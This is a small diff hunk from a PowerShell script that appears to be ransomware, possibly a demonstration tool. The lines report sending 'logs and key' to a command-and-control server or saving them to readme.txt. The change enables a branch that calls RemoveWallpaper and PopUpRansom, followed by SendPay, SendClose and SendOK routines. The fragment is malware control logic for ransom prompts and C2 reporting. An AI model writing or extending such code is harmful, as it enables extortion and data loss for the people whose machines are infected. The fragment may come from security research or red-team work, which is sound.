@@ -344,7 +344,7 @@ else {
    if (!$C2Status) { Write-Host "[+] Saving logs and key in readme.txt.." -ForegroundColor Blue }
    else { Write-Host "[+] Sending logs and key to Command & Control Server.." -ForegroundColor Blue }}
 
-  # if ($args -like "-demo") { RemoveWallpaper ; PopUpRansom
+   if ($args -like "-demo") { RemoveWallpaper ; PopUpRansom
    if ($PayNow -eq "True") { SendPay ; SendOK } else { SendClose ; SendOK }}
    else { SendOK }
 
